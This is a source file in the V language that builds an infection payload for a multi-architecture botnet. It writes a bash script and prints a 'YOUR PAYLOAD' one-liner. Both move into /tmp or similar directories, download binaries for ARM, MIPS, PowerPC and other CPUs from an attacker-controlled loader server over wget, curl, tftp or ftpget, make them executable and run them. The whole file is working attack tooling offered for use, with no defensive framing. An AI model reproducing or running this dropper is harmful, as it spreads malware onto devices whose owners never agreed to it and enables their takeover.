module main

import toml
import json
import net.http
import os

struct Config {
	shell_name     string
	bin_shell_name string
	binary_name    string

	ftp_login    string
	ftp_password string
	ftp_server   string
	tftp_server  string

	loader_server string

	archs []string
}

fn main() {
	c := config()!
	c.create()
}

pub fn (c Config) create() {

	os.rm(c.bin_shell_name) or {}
	mut file := os.create(c.bin_shell_name) or {panic(err)}
	
	tftp_split := c.tftp_server.split(':')
	ftp_split := c.ftp_server.split(':')
	file.writeln("#!/bin/bash") or {}

	for i in c.archs {
		file.writeln( "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://${c.loader_server}/${i}; curl -O http://${c.loader_server}/${i}; cat ${i} >${c.binary_name};chmod +x *;./${c.binary_name}") or {}
	}

	println('\n=================== YOUR PAYLOAD ===================\n')
	println('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://${c.loader_server}/${c.shell_name} || curl -O http://${c.loader_server}/${c.shell_name} || tftp ${tftp_split[0]} ${tftp_split[1]} -c get ${c.bin_shell_name} || ftpget -v -u ${c.ftp_login} -p ${c.ftp_password} -P ${ftp_split[1]} ${ftp_split[0]} ${c.shell_name} ${c.shell_name}; chmod +x ${c.shell_name}; sh ${c.shell_name}')
}

fn config() !Config {
	archs := [
		'arm5.bin',
		'arm6.bin',
		'x32.bin',
		'x86_64.bin',
		'arm7.bin',
		'mips.bin',
		'mips32le.bin',
		'mips64le.bin',
		'ppc64.bin',
		's390x.bin',
	]
	return Config{
		archs: archs
		shell_name: get_value('Payload.ShellName')!
		bin_shell_name: './bin/' + get_value('Payload.ShellName')!
		ftp_login: get_value('Payload.FtpLogin')!
		ftp_password: get_value('Payload.FtpPassword')!
		binary_name: get_value('Payload.BinaryName')!
		loader_server: get_value('LoaderServer')!.replace('0.0.0.0', get_ip()!)
		ftp_server: get_value('FtpServer')!.replace('0.0.0.0', get_ip()!)
		tftp_server: get_value('TftpServer')!.replace('0.0.0.0', get_ip()!)
	}
}

fn get_value(key string) !string {
	config := toml.parse_file('config.toml') or {
		println("Can't parse config")
		exit(0)
	}
	return config.value(key).string()
}

struct Json {
	query string [required]
}

fn get_ip() !string {
	resp := http.get('http://ip-api.com/json/?fields=query')!
	ga := json.decode(Json, resp.body)!
	return ga.query
}
